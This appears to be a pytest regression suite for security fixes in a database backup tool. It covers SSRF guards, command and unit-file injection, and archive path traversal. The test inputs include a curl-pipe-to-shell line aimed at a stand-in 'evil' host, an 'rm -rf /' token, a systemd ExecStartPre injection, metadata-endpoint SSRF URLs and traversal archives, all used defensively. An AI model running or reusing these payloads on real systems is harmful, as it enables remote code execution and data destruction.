# -*- coding: utf-8 -*-
"""BUG/安全整改专项回归：注入、SSRF、路径穿越、未定义名与前端分页契约。

覆盖本轮修复的可判定行为；真实数据库/SSH 链路不在本文件范围内。
"""
import io
import tarfile
import zipfile

import pytest

from core import agent_hosts, archive_guard, net_guard
from core.vm import verify as vmverify


def _read(rel):
    with open(rel, encoding="utf-8") as f:
        return f.read()


# ---------------- 出站目标校验 ----------------

def test_url_guard_blocks_loopback_metadata_and_file_scheme():
    for url in ("http://127.0.0.1:8080/api/x", "http://[::1]/",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd", "gopher://127.0.0.1/x",
                "http://metadata.google.internal/"):
        ok, reason = net_guard.validate_url(url)
        assert ok is False, url
        assert reason


def test_url_guard_allows_intranet_private_target():
    # 离线部署的 webhook/KMS 常指向内网地址，私网默认允许
    ok, _ = net_guard.validate_url("http://192.168.220.170:8080/hook")
    assert ok is True
    ok, _ = net_guard.validate_url("https://10.0.0.9:8443/decrypt")
    assert ok is True


def test_url_guard_rejects_bad_port_and_empty():
    assert net_guard.validate_url("")[0] is False
    assert net_guard.validate_url("http://example.com:99999/x")[0] is False


def test_tcp_guard():
    assert net_guard.validate_tcp_target("127.0.0.1", 8080)[0] is False
    assert net_guard.validate_tcp_target("169.254.169.254", 80)[0] is False
    assert net_guard.validate_tcp_target("192.168.220.170", 5432)[0] is True
    assert net_guard.validate_tcp_target("192.168.220.170", 0)[0] is False


# ---------------- 恢复验证检查项 ----------------

def test_vm_exec_check_disabled_by_default(monkeypatch):
    monkeypatch.setattr("core.db.get_system_config", lambda *a, **k: "")
    r = vmverify.run_platform_check("exec:curl http://evil/x | sh")
    assert r.ok is False
    assert "禁用" in r.message


def test_vm_exec_check_rejects_shell_meta_even_when_enabled(monkeypatch):
    monkeypatch.setattr("core.db.get_system_config", lambda *a, **k: "1")
    r = vmverify.run_platform_check("exec:echo hi; id")
    assert r.ok is False
    assert "shell 元字符" in r.message


def test_vm_exec_check_rejects_non_whitelisted_binary(monkeypatch):
    monkeypatch.setattr("core.db.get_system_config", lambda *a, **k: "1")
    r = vmverify.run_platform_check("exec:python3 -c 'import os'")
    assert r.ok is False
    assert "白名单" in r.message


def test_vm_url_check_blocks_ssrf():
    r = vmverify.run_platform_check("url:http://127.0.0.1:8080/api/x")
    assert r.ok is False
    assert "被拒绝" in r.message


def test_vm_tcp_check_blocks_loopback():
    r = vmverify.run_platform_check("tcp:127.0.0.1:8080")
    assert r.ok is False


# ---------------- Agent token ----------------

def test_agent_token_rejects_unit_injection():
    with pytest.raises(ValueError):
        agent_hosts.create_host({
            "hostname": "192.168.1.2",
            "token": "abc\nExecStartPre=/bin/sh -c 'id>/tmp/pwn'",
        })


def test_agent_token_rejects_shell_meta():
    with pytest.raises(ValueError):
        agent_hosts.create_host({"hostname": "192.168.1.2",
                                 "token": "abcdef;rm -rf /"})


# ---------------- 归档解包 ----------------

def test_tar_traversal_rejected(tmp_path):
    pkg = tmp_path / "evil.tar.gz"
    with tarfile.open(str(pkg), "w:gz") as tf:
        data = b"pwn"
        info = tarfile.TarInfo("../../evil.txt")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    dest = tmp_path / "out"
    with tarfile.open(str(pkg)) as tf:
        with pytest.raises(ValueError):
            archive_guard.safe_extract_tar(tf, str(dest))
    assert not (tmp_path / "evil.txt").exists()


def test_tar_symlink_rejected(tmp_path):
    pkg = tmp_path / "link.tar.gz"
    with tarfile.open(str(pkg), "w:gz") as tf:
        info = tarfile.TarInfo("link")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        tf.addfile(info)
    with tarfile.open(str(pkg)) as tf:
        with pytest.raises(ValueError):
            archive_guard.safe_extract_tar(tf, str(tmp_path / "out"))


def test_tar_normal_member_ok(tmp_path):
    pkg = tmp_path / "ok.tar.gz"
    with tarfile.open(str(pkg), "w:gz") as tf:
        data = b"hello"
        info = tarfile.TarInfo("data/file.txt")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    dest = tmp_path / "out"
    with tarfile.open(str(pkg)) as tf:
        assert archive_guard.safe_extract_tar(tf, str(dest)) == 1
    assert (dest / "data" / "file.txt").read_bytes() == b"hello"


def test_zip_traversal_rejected(tmp_path):
    pkg = tmp_path / "evil.zip"
    with zipfile.ZipFile(str(pkg), "w") as zf:
        zf.writestr("../evil.txt", "pwn")
    with zipfile.ZipFile(str(pkg)) as zf:
        with pytest.raises(ValueError):
            archive_guard.safe_extract_zip(zf, str(tmp_path / "out"))


def test_member_guard_rejects_windows_drive():
    assert archive_guard.is_safe_member("C:/Windows/x", "/tmp/out") is False
    assert archive_guard.is_safe_member("/etc/passwd", "/tmp/out") is False
    assert archive_guard.is_safe_member("a/../b", "/tmp/out") is False
    assert archive_guard.is_safe_member("a/b.txt", "/tmp/out") is True


# ---------------- 源码契约（防回退） ----------------

def test_pg_restore_prep_uses_shlex_quote():
    src = _read("core/remote_dump.py")
    assert "WHERE datname = '{db_name}'" not in src
    assert "q_drop_force = shlex.quote(" in src
    assert 'safe_db_lit = db_name.replace("\'", "\'\'")' in src


def test_dumpall_error_no_undefined_name():
    src = _read("core/remote_dump.py")
    assert "bin={dumpall_bin}" not in src


def test_undefined_name_fixes():
    assert "from core import license as license_mod" in _read("api/tasks.py")
    assert "FROM all_synonyms WHERE owner=?" in _read("core/db_migrate.py")


def test_webhook_secret_not_returned():
    src = _read("api/restore.py")
    assert '"has_secret": bool(secret)' in src
    assert '"secret": secret' not in src


def test_kms_and_webhook_url_guard_wired():
    assert "net_guard.validate_url(endpoint)" in _read("core/crypto_pool.py")
    assert "net_guard.validate_url(cfg[\"kms_endpoint\"])" in _read("api/system.py")
    assert "net_guard.validate_url(u)" in _read("api/restore.py")
    assert "net_guard.validate_url(url)" in _read("core/webhooks.py")


def test_safe_extract_wired_at_all_three_entries():
    for rel in ("core/ferry_inbox.py", "core/engines/base.py",
                "core/plugin_installer.py"):
        assert "archive_guard.safe_extract" in _read(rel), rel


def test_pager_callbacks_wired():
    src = _read("static/js/operations.js")
    assert "renderLongRunning(rows)" in src
    assert "renderFrequency(rows)" in src
    assert ", null);" not in src
    assert "pgLongRunning.startNo + ri" in src


def test_clone_reload_no_silent_pass():
    src = _read("api/tasks.py")
    assert '"warning": warning' in src
    assert "调度重载失败" in src


def test_csrf_and_op_guard_hardening():
    assert "not o.scheme or not o.netloc" in _read("api/__init__.py")
    assert '@permission_required("security.manage")' in _read("api/op_guard.py")


def test_readonly_role_write_gate():
    """只读角色不能写，探测类 POST 仍放行。"""
    from flask import Flask, session

    from api import _api_security_gate

    app = Flask(__name__)
    app.secret_key = "test-only"
    with app.test_request_context("/api/tasks", method="POST"):
        session["user"] = {"username": "v", "role": "viewer"}
        resp = _api_security_gate()
        assert resp is not None and resp[1] == 403
    with app.test_request_context("/api/tasks/1/precheck", method="POST"):
        session["user"] = {"username": "v", "role": "viewer"}
        assert _api_security_gate() is None
    with app.test_request_context("/api/tasks", method="POST"):
        session["user"] = {"username": "a", "role": "admin"}
        assert _api_security_gate() is None


def test_temp_cnf_created_with_strict_permissions():
    src = _read("core/remote_dump.py")
    assert "os.O_CREAT | os.O_EXCL, 0o600" in src
    assert src.count("os.O_CREAT | os.O_EXCL, 0o600") == 5
    assert 'with open(cnf_local, "wb") as f:' not in src
